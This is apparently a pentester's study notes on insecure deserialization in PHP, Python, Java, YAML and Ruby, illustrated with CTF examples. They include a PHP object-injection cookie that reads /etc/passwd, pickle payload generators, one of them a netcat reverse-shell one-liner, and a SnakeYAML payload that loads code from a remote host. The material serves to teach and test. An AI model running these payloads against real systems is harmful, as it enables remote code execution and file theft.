
# What are serialization and deserialization?

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:

- Write complex data to inter-process memory, a file, or a database
- Send complex data, for example, over a network, between different components of an application, or in an API call

Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.

![](../../zzz_res/attachments/serialization.png)

**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.

>[!Caution]
>Based on the programming language, the **serialization** process can also be named **marshalling** (Ruby/Java) or **pickling** (Python)

# Insecure Deserialization

Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "**object injection**" vulnerability.

An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.

## PHP

PHP is known to be one of the languages most vulnerable to deserialization and Object Injection because it uses “[magic method](https://www.php.net/manual/en/language.oop5.magic.php)”, special methods which override PHP's default's action when certain actions are performed on an object.

**PHP serialization format**

The syntax generally follows the pattern of one-letter code of the variable type, followed by a colon, followed by the variable value, followed by a semicolon.

| Type | Serialization examples |
| --- | --- |
| Null | N; |
| Boolean | b:1;b:0; |
| Integer | i:685230;i:-685230; |
| Floating point | d:685230.15;d:INF;d:-INF;d:NAN; |
| String | s:6:"A to Z"; |
| Associative array | a:4:{i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:"A to Z";}a:2:{i:42;b:1;s:6:"A to Z";a:3:{i:0;i:1;i:1;i:2;i:2;i:3;}} |
| Object | O:8:"stdClass":2:{s:4:"John";d:3.14;s:4:"Jane";d:2.718;} |
| Reference | a:2:{i:0;O:10:"HelloWorld":0:{}i:1;r:2;} r:2; is the reference |
| Custom | C:19:"SplDoublyLinkedList":33:{i:0;:O:10:"HelloWorld":0:{}:i:42;} |

>[!warning] Common sinks and point of warning
>- `unserialize()`
>- `__unserialize()`
>- Objects that implement the `Serializable` interface contain two methods `serialize` and `unserialize`. When serializing such an object a string of the following format will be returned: `C:<number of characters in the class name>:"<class name>":<length of the output of the serialize method>:{<output of the serialize method>}`

**Magic method**

Magic method used with **serialization** (`serialize()`, `__serialize()`):

- `__sleep()`: is called when an object is serialized and must be returned to array

Magic method used with **deserialization** (`unserialize()`, `__unserialize()`):

- `__wakeup()`: is called when an object is deserialized.
- `__destruct()`: is called when PHP script end and object is destroyed.
- `__toString()`: uses object as string but also can be used to read file or more than that based on function call inside it.

>[!danger]
>Also **[Autoload Classes](https://www.php.net/manual/en/language.oop5.autoload.php)** may also be dangerous!

### Classis PHP Object Injection vulnerability

Example from [**Toxic**](https://www.notion.so/Toxic-39ca22b681c0491cac18bdda0a7c5614) 

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

```php
<?php
class PageModel
{
    public $file;

    public function __destruct()
    {
        include($this->file);
    }
}
```

If we provide an insecure serialized object to the `unserialize($cookie);` we are able inject a new PHP object that when destructed (`__destruct()`) will execute an arbitrary include, providing Local File Inclusion (`include($this->file);`)

The PoC cookie value would be something like this:

```php
<@base64>O:9:"PageModel":1:{s:4:"file";s:33:"php://filter/resource=/etc/passwd";}<@/base64>
```

### Bypass checks on serialized object exploiting parser differentials

- [WAFfle-y Order](../../Play%20ground/CTFs/WAFfle-y%20Order.md)

### PHAR deserialization

In PHP it is sometimes possible to exploit deserialization even if there is no obvious use of the `unserialize()` method. This can be achieved though the `phar://` wrapper, which provides a stream interface for accessing PHP Archive (`.phar`) files. Those files contain **serialized metadata** that are implicitly deserialized when filesystem operations are performed on the `phar://` stream.

>[!info] Pre-requisites:
>- A **file upload primitive** allowing to upload a `PHAR` files or a **polyglot file** interpreted as it
>- A filesystem method such as `include()`, `fopen()` or `file_exists()` into which the `phar://` stream is passed

As long as the class of the object is supported by the website, both the `__wakeup()` and `__destruct()` magic methods can be invoked in this way, allowing you to potentially kick off a gadget chain using this technique.

References:
- [Top 10 web hacking techniques of 2018](https://portswigger.net/research/top-10-web-hacking-techniques-of-2018#6)
- [PHAR Deserialization](https://portswigger.net/web-security/deserialization/exploiting#phar-deserialization)

## Python

### Pickle

Pickle is a Python module used to serialize and deserialize objects. As also said within the official documentation, pickle is not secure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling through the use of the `__reduce__()` method.

- [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

Example from [**baby website rick**](https://www.notion.so/baby-website-rick-6f001c5e8ffa48eab3f9ab57073a876f) 

```python
#!/usr/bin/env python
import pickle
import pickletools
import base64
import os
import subprocess

class anti_pickle_serum(object):
	def __reduce__(self):
		cmd = ['cat', 'flag_wIp1b']
		#return os.system, (cmd,)
		return subprocess.check_output, (cmd,)

exploit_obj = anti_pickle_serum()
raw_pickle = pickle.dumps({"serum" : exploit_obj}, protocol=0)

optimed_pickle = pickletools.optimize(raw_pickle)
pickletools.dis(optimed_pickle)

payload = base64.b64encode(raw_pickle)
#print "Payload: "+payload
print(payload)
```

Example from [DevOops](https://www.notion.so/DevOops-328e4135b49d4c9aac1687410b4d6204) 

```python
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']

## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)
```

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

## Java

Java (and some other languages) uses binary serialization formats. Serialized Java objects always begin with the same bytes:
- `ac ed` in hexadecimal 
- `rO0` in Base64

>[!warning] Sinks:
>- `java.io.Serializable`
>- `readObject()`

## YAML

**Old versions** of pyyaml (like SnakeYAML) were vulnerable to deserialisations attacks if you **didn't specify the Loader** when loading something: `yaml.load(data)`

- [SnakeYaml Deserilization exploited](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)
- [Swagger YAML Parser Vulnerability (CVE-2017-1000207 and CVE-2017-1000208)](https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/)

Example from [Ophiuchi](https://www.notion.so/Ophiuchi-c77afe7fb3a2427f8a11b60265ed968b) 

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.14.24"]]]]
```

Payload can be found here: [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)


## Ruby

Serialized object example:
```ruby
$ irb
>> class Person
>>   attr_accessor :name
>> end
=> nil

>> p = Person.new
=> #<Person:0x00005584ba9af490>

>> p.name = "Luke Jahnke"
=> "Luke Jahnke"

>> p
=> #<Person:0x00005584ba9af490 @name="Luke Jahnke">

>> Marshal.dump(p)
=> "\x04\bo:\vPerson\x06:\n@nameI\"\x10Luke Jahnke\x06:\x06ET"

>> Marshal.load("\x04\bo:\vPerson\x06:\n@nameI\"\x10Luke Jahnke\x06:\x06ET")
=> #<Person:0x00005584ba995dd8 @name="Luke Jahnke">
```

References:
- [devcraft.io - Building a custom chain](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
- [elttam](https://www.elttam.com/blog/ruby-deserialization/)
- [Phrack](http://phrack.org/issues/69/12.html)


## NodeJS & JavaScript

See [Prototype Pollution](Prototype%20Pollution.md)

---

# Gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal.

>[!important]
>A gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain.
This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off gadget".

To identify and construct gadget chains, **source code must be available** or, alternatively, **already existing chains for shared libraries can be used**.

Useful tools are:
- [ysoserial](https://github.com/frohoff/ysoserial)
	- The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. 
	- `JRMPClient` is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. 
- [phpgcc](https://github.com/ambionics/phpggc)
- Existing writeups with known chains

## Creating your own exploit

>[!warning]
>Source code access required

Standard steps for research:
1. Study the source code to **identify a class** that contains a **magic method** that is invoked during deserialization
	1. Assess the code that this magic method executes to **see if it directly does anything dangerous** 
	2. If the magic method is not exploitable on its own, it can serve as your "**kick-off gadget**" for a gadget chain
2. Study any methods that the kick-off gadget invokes
	1. Do any of these do something dangerous with data that you control? 
		1. If not, take a closer look at each of the methods that they subsequently invoke, and so on.
3. Repeat until you read a dead end or you identify a **dangerous sink gadget**
4. Create a valid serialized object studying the class declaration in the source code

---

# External Resources

- [Insecure deserialization | Web Security Academy](https://portswigger.net/web-security/deserialization)
- [Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
- [Deserialization - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)